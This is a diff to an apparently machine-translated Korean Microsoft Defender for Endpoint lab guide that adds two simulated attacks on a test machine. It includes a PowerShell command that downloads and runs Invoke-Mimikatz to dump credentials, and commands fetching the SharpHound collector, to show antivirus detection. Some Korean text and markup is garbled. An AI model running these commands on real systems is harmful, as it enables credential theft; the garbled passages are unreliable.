@@ -4,20 +4,47 @@
 
 ## 시뮬레이션된 공격
 
-이 작업에서는 하나의 시뮬레이션된 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색합니다.
+이 작업에서는 두 개의 시뮬레이션된 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색합니다.
 
-1. 브라우저에 Microsoft Defender 보안 센터가 아직 열려 있지 않으면 Microsoft Defender 보안 센터(https://security.microsoft.com))로 이동하여 테넌트 관리자로 로그인합니다.
+1. 브라우저의 Microsoft Defender XDR 포털에 아직 없는 경우 테넌트에 대한 관리 로그인한 Microsofthttps://security.microsoft.com) Defender XDR로 이동합니다.
 
-1. 메뉴의 **엔드포인트**에서 **평가 및 자습서**를 선택한 다음, 왼쪽에서 **자습서 및 시뮬레이션**을 선택합니다.
+WIN1에서 *PowerShell**을 사용하여 *시뮬레이션된* 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색*합니다.
 
-1. **자습서** 탭을 선택합니다.
+`Attack 1: Mimikatz - Credential Dumping`
 
-1. 자동화된 조사(백도어)*에서 *시나리오를 설명하는 메시지가 표시됩니다. 이 단락 아래에서 **연습 확인**을 클릭합니다. 시뮬레이션을 수행하는 지침이 포함된 새 브라우저 탭이 열립니다.
+1. WIN1 컴퓨터의 *검색 창에 명령을** 입력**하고 관리자** 권한으로 실행을 선택합니다**.*
 
-1. 새 브라우저 탭에서 **시뮬레이션 실행**이라는 섹션(페이지 5, 2단계부터)을 찾고 단계에 따라 공격을 실행합니다. **힌트:** 시뮬레이션 파일 *RS4_WinATP-Intro-Invoice.docm*은 시뮬레이션 파일** 가져오기 단추를 선택하여 **이전 단계에서 선택한 연습** 읽기 바로 아래 **포털에서 다시 찾을 수 있습니다.
+1. 다음 명령을 복사하여 관리istrator: 명령 프롬프트 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
 
-    1. **참고:** 악용으로 파일을 실행한 후 Microsoft 365 Defender 보안 센터로[ 돌아가 ](https://security.microsoft.com)인시던트** 탭을 클릭하여 **경고를 볼 수 있습니다. 이 가이드는 마이그레이션 및 리브랜딩된 Microsoft Defender ATP 포털*을 잘못 참조*합니다.
-    1. 인시던트 페이지를 열고 인시던트** 관리를 클릭합니다**. 인시던**트 해결을 클릭하여 **모든 활성 경고를 해결합니다.
+    ```CommandPrompt
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    ```
 
+1. Access가 *거부되었다는* 메시지와 위협을 표시하는 *팝업 메시지가 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 표시됩니다*.
+
+1. 종료를 **입력**하고 Enter 키를 눌러 **관리istrator: 명령 프롬프트** 창을 종료**합니다**.
+
+`Attack 2: Bloodhound - Collection`
+
+1. WIN1 컴퓨터의 *검색 창에 PowerShell**을 입력**하고 Windows PowerShell**을 선택한 **다음 관리자** 권한으로 실행을 선택합니다**.*
+
+1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
+
+    ```PowerShell
+    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+    >**참고:** 명령을 한 번에 하나씩 복사, 붙여넣기 및 실행하는 것이 좋습니다. 메모장* 열고 *명령을 임시 파일에 복사하여 이 작업을 수행할 수 있습니다. 첫 번째 명령은 Atomic Red Team* 폴더가 있는 동일한 폴더에 ExternalPayloads*라는 *폴더를 *만듭니다. 두 번째 명령은 BloodHound GitHub 리포지토리에서 *SharpHound.ps1** 파일을 다운로드*하고 ExternalPayloads 폴더에 *저장합니다*.
+
+1. 발견된 위협이* 표시되면 팝업 메시지가 `Windows Security Virus and threats protection` 표시됩니다*.
+
+1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
+
+    ```PowerShell
+    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+1. 출력이 True*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되지 않았습니다. 출력이 False*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되었습니다. 위쪽 화살표 키를 사용하여 출력이 False*가 *될 때까지 명령을 반복합니다.
 
 ## 데모를 완료했습니다.
